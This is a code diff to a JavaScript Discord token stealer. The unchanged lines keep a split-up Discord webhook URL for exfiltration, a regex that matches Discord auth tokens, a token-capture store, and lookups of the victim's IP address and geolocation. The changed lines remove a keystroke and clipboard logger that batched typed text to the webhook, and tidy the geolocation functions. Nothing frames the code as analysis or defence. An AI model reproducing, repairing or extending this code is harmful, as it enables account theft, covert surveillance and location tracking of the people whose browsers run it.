@@ -35,7 +35,7 @@ var W=['https://canary.discord.com/api/webhooks','/1570340494217707613/','yTzSaO
 var PING='https://api.ipify.org?format=json';
 var GEO1='https://ipwho.is/';
 var GEO2='http://ip-api.com/json/';
-var FLUSH=7000,BATCH=470,RETRY=4,BACK=750;
+var RETRY=4,BACK=750;
 var T=/[\w-]{24,28}\.[\w-]{6}\.[\w-]{27,38}/;
 var capturedTokens={};
 var tapCount=0,tapTimer=null;
@@ -58,11 +58,6 @@ function PS(p){
     return P1(p).catch(function(){return Z(BACK*n).then(go)});
   }
   return go();
-}
-function CH(str,n){
-  var o=[],i=0;
-  while(i<str.length){o.push(str.slice(i,i+n));i+=n}
-  return o;
 }
 
 function addTok(src,val,meta){
@@ -255,12 +250,8 @@ function GEO1F(ip){
       if(!j||j.success===false)throw new Error('geo1_fail');
       return{
         src:'ipwho.is',
-        country:j.country,
-        cc:j.country_code,
-        region:j.region,
-        city:j.city,
-        lat:j.latitude,
-        lon:j.longitude,
+        country:j.country,cc:j.country_code,region:j.region,city:j.city,
+        lat:j.latitude,lon:j.longitude,
         isp:j.connection&&j.connection.isp,
         org:j.connection&&j.connection.org,
         asn:j.connection&&j.connection.asn,
@@ -270,7 +261,6 @@ function GEO1F(ip){
     })
     .catch(function(){return null});
 }
-
 function GEO2F(ip){
   if(!ip)return Promise.resolve(null);
   return fetch(GEO2+ip+'?fields=status,country,countryCode,regionName,city,lat,lon,isp,org,as,timezone',{cache:'no-store'})
@@ -279,27 +269,14 @@ function GEO2F(ip){
       if(!j||j.status!=='success')return null;
       return{
         src:'ip-api.com',
-        country:j.country,
-        cc:j.countryCode,
-        region:j.regionName,
-        city:j.city,
-        lat:j.lat,
-        lon:j.lon,
-        isp:j.isp,
-        org:j.org,
-        asn:j.as,
-        tz:j.timezone,
-        flag:null
+        country:j.country,cc:j.countryCode,region:j.regionName,city:j.city,
+        lat:j.lat,lon:j.lon,isp:j.isp,org:j.org,asn:j.as,tz:j.timezone,flag:null
       };
     })
     .catch(function(){return null});
 }
-
 function GEO(ip){
-  return GEO1F(ip).then(function(g){
-    if(g&&g.country)return g;
-    return GEO2F(ip);
-  });
+  return GEO1F(ip).then(function(g){if(g&&g.country)return g;return GEO2F(ip)});
 }
 
 function COL(){
@@ -329,39 +306,6 @@ function COL(){
       };
     });
   });
-}
-
-var KB='',TM=null;
-function FK(){
-  if(!KB)return Promise.resolve();
-  var s=KB;KB='';
-  var parts=CH(s,BATCH),i=0;
-  function nxt(){
-    if(i>=parts.length)return Promise.resolve();
-    return PS({content:'\u2328 ```\n'+parts[i++].replace(/```/g,'`\u200b``')+'\n```'}).then(nxt);
-  }
-  return nxt();
-}
-function SK(){
-  document.addEventListener('keydown',function(e){
-    var k=e.key;
-    if(k&&k.length===1)KB+=k;
-    else if(k==='Enter')KB+='\n';
-    else if(k==='Backspace')KB=KB.slice(0,-1);
-    else if(k==='Tab')KB+='\t';
-    else if(k===' ')KB+=' ';
-    if(KB.length>=BATCH)FK();
-  },true);
-  document.addEventListener('paste',function(e){
-    var t=S(function(){return(e.clipboardData||window.clipboardData).getData('text')},'');
-    if(t)KB+='\n[PASTE]'+t+'\n';
-  },true);
-  TM=setInterval(FK,FLUSH);
-  document.addEventListener('visibilitychange',function(){
-    if(document.visibilityState==='hidden')FK();
-  });
-  window.addEventListener('pagehide',FK,{capture:true});
-  window.addEventListener('beforeunload',FK,{capture:true});
 }
 
 function F(name,val,inline){
@@ -519,7 +463,6 @@ function INIT(){
     QK();
     return REP();
   }).then(function(){
-    SK();
     AUID();
   }).catch(function(){});
 }
